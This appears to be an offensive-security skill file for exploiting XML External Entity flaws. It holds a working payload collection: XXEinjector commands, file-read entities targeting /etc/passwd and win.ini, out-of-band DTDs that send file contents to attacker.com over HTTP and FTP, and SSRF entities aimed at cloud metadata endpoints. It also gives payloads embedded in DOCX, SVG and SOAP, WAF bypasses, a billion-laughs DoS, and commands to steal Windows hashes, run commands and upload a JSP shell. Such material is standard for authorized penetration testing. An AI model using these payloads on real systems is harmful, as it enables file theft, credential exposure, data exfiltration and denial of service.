---
name: xxe-poc
category: exploit
tags:
  - xxe
  - xml-injection
  - external-entity
  - file-read
  - ssrf
  - oob-exfiltration
triggers:
  - xxe vulnerability
  - xml external entity
  - xml injection
  - dtd injection
  - xml parser
os: cross-platform
---

# XXE-POC

## Purpose

Exploit XML External Entity (XXE) vulnerabilities to read local files, perform SSRF attacks, and exfiltrate data. XXE occurs when XML parsers process external entity declarations in user-supplied XML input without proper restrictions.

## Tools

### XXEinjector

- **Description**: Automated XXE exploitation with direct and OOB methods
- **Language**: Ruby
- **GitHub**: https://github.com/enjoiz/XXEinjector

### Supporting Tools

- **xxeserv/xxeftp**: Mini webserver with FTP for OOB payloads
- **oxml_xxe**: Embed XXE in Office files (DOCX/XLSX/PPTX)
- **docem**: Embed XXE in document files

## Installation

### XXEinjector Installation

```bash
# Clone repository
git clone https://github.com/enjoiz/XXEinjector.git
cd XXEinjector

# Run
ruby XXEinjector.rb --help
```

### xxeserv Installation

```bash
# Clone repository
git clone https://github.com/staaldraad/xxeserv.git
cd xxeserv

# Build
go build -o xxeserv

# Run
./xxeserv -o files.log -p 2121 -w -wd public -wp 8000
```

## CLI Reference

### XXEinjector Options

```
Required:
  --host          Your IP for reverse connections (--host=192.168.0.2)
  --file          HTTP request file with XML (--file=/tmp/req.txt)
  --path          Path to enumerate (--path=/etc)
  --brute         File with paths to bruteforce (--brute=/tmp/brute.txt)

Connection:
  --rhost         Remote host IP/domain
  --rport         Remote port (default from Host header)
  --ssl           Use SSL/HTTPS
  --proxy         Proxy to use (--proxy=127.0.0.1:8080)

OOB Methods:
  --oob           OOB method: http/ftp/gopher (default: ftp)
  --httpport      Custom HTTP port (default 80)
  --ftpport       Custom FTP port (default 21)
  --gopherport    Custom gopher port (default 70)

Exploitation:
  --direct        Direct exploitation (--direct=STARTMARK,ENDMARK)
  --cdata         Use CDATA for direct exploitation
  --phpfilter     Base64 encode with PHP filter
  --netdoc        Use netdoc protocol (Java)
  --expect        PHP expect command execution (--expect=ls)
  --upload        Upload file via Java jar (--upload=/tmp/file.txt)
  --hashes        Steal Windows hashes
  --xslt          Test for XSLT injection

Other:
  --2ndfile       Second order exploitation request
  --enumports     Enumerate open ports (--enumports=all)
  --logger        Log mode only, don't send requests
  --test          Show payload without sending
  --timeout       Response timeout (--timeout=20)
  --verbose       Verbose output
```

## XXE Fundamentals

### Entity Types

```xml
<!-- Internal Entity -->
<!ENTITY name "value">

<!-- External Entity (SYSTEM) -->
<!ENTITY name SYSTEM "file:///etc/passwd">

<!-- External Entity (PUBLIC) -->
<!ENTITY name PUBLIC "desc" "http://attacker.com/file">

<!-- Parameter Entity (DTD only) -->
<!ENTITY % name "value">
```

### Basic XXE Structure

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

## Classic XXE Payloads

### File Read (Linux)

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

### File Read (Windows)

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file:///c:/windows/win.ini">
]>
<data>&file;</data>
```

### Base64 Encoded Read

```xml
<!DOCTYPE data [
  <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<data>&file;</data>
```

### PHP Wrapper

```xml
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<data>&xxe;</data>
```

## XInclude Attack

Use when you cannot modify DOCTYPE:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## Blind XXE (OOB)

### Basic OOB Test

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://attacker.com/test">
  %xxe;
]>
<root>test</root>
```

### OOB Data Exfiltration

**Malicious XML:**

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
  %send;
]>
<data>test</data>
```

**External DTD (xxe.dtd):**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

### OOB with PHP Filter

**Malicious XML:**

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
  %param1;
]>
<data>&exfil;</data>
```

**External DTD:**

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%data;'>">
```

### FTP OOB Exfiltration

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://attacker.com:2121/%data;'>">
%param1;
```

## Error-Based XXE

### Using Remote DTD

**Malicious XML:**

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
  <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
  %ext;
]>
<message></message>
```

**External DTD (ext.dtd):**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

### Using Local DTD (Linux)

```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % constant 'aaa)>
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///x/%file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    <!ELEMENT aa (bb'>
  %local_dtd;
]>
<message>test</message>
```

### Using Local DTD (Windows)

```xml
<!DOCTYPE doc [
  <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
  <!ENTITY % SuperClass '>
    <!ENTITY &#x25; file SYSTEM "file:///C:/Windows/win.ini">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://x/%file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    <!ENTITY test "test"'
  >
  %local_dtd;
]>
<xxx>test</xxx>
```

## XXEinjector Workflows

### Directory Enumeration

```bash
# Enumerate /etc directory
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt

# With SSL
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl

# Using gopher
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher
```

### File Bruteforcing

```bash
# Bruteforce file paths
ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/paths.txt --file=/tmp/req.txt

# With HTTP OOB and netdoc
ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/paths.txt --file=/tmp/req.txt --oob=http --netdoc
```

### Direct Exploitation

```bash
# Direct with markers
ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=XXESTART,XXEEND

# With CDATA
ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --cdata
```

### Advanced Exploitation

```bash
# Steal Windows hashes
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --hashes

# Execute commands (PHP)
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=whoami

# Upload file (Java)
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/shell.jsp

# XSLT injection test
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --xslt
```

### Request File Format

```http
POST /api/parse HTTP/1.1
Host: target.com
Content-Type: application/xml
Content-Length: 100

<?xml version="1.0"?>
XXEINJECT
<data>test</data>
```

## XXE via SSRF

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal.server/admin">
]>
<foo>&xxe;</foo>
```

### Cloud Metadata

```xml
<!-- AWS -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

<!-- GCP -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">

<!-- Azure -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance">
```

## XXE in Exotic Files

### SVG File

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### DOCX/XLSX Injection

1. Extract Office file:

```bash
unzip document.docx -d extracted/
```

2. Inject payload in `word/document.xml` or `xl/workbook.xml`:

```xml
<?xml version="1.0"?>
<!DOCTYPE doc [
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
]>
```

3. Rebuild:

```bash
cd extracted/
zip -r ../malicious.docx *
```

### SOAP Injection

```xml
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://attacker.com/"> %dtd;]><x/>]]>
  </foo>
</soap:Body>
```

## WAF Bypasses

### Character Encoding

```bash
# Convert to UTF-16
cat payload.xml | iconv -f UTF-8 -t UTF-16BE > payload_utf16.xml
```

### JSON to XML

Change Content-Type and convert:

```
Content-Type: application/json -> application/xml

{"search":"test"} -> <root><search>test</search></root>
```

### CDATA Bypass

```xml
<!DOCTYPE data [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % all "<!ENTITY filedata '%start;%file;%end;'>">
]>
<data>&filedata;</data>
```

## Denial of Service

### Billion Laughs Attack

```xml
<!DOCTYPE data [
  <!ENTITY a0 "dos">
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

⚠️ **Warning**: Do not use DoS payloads without explicit permission.

## Common DTD Paths

### Linux

```
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/share/xml/svg/svg10.dtd
/usr/share/xml/svg/svg11.dtd
/usr/share/yelp/dtd/docbookx.dtd
```

### Windows

```
C:\Windows\System32\wbem\xml\cim20.dtd
C:\Windows\System32\wbem\xml\wmi20.dtd
```

## Troubleshooting

| Issue                 | Solution                      |
| --------------------- | ----------------------------- |
| No output             | Try OOB/blind techniques      |
| Entities disabled     | Use XInclude or error-based   |
| Filtered characters   | Try encoding (base64, UTF-16) |
| Newlines break output | Use PHP filter base64         |
| Large files fail      | Use FTP OOB instead of HTTP   |
| Timeout               | Increase --timeout value      |

## Security Considerations

- XXE can lead to sensitive file disclosure
- SSRF via XXE can access internal networks
- DoS attacks can crash servers
- Always verify scope and authorization
- Document all accessed files
- Test in isolated environments when possible

## References

- XXEinjector: https://github.com/enjoiz/XXEinjector
- PayloadsAllTheThings XXE: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- OWASP XXE: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
- PortSwigger XXE: https://portswigger.net/web-security/xxe
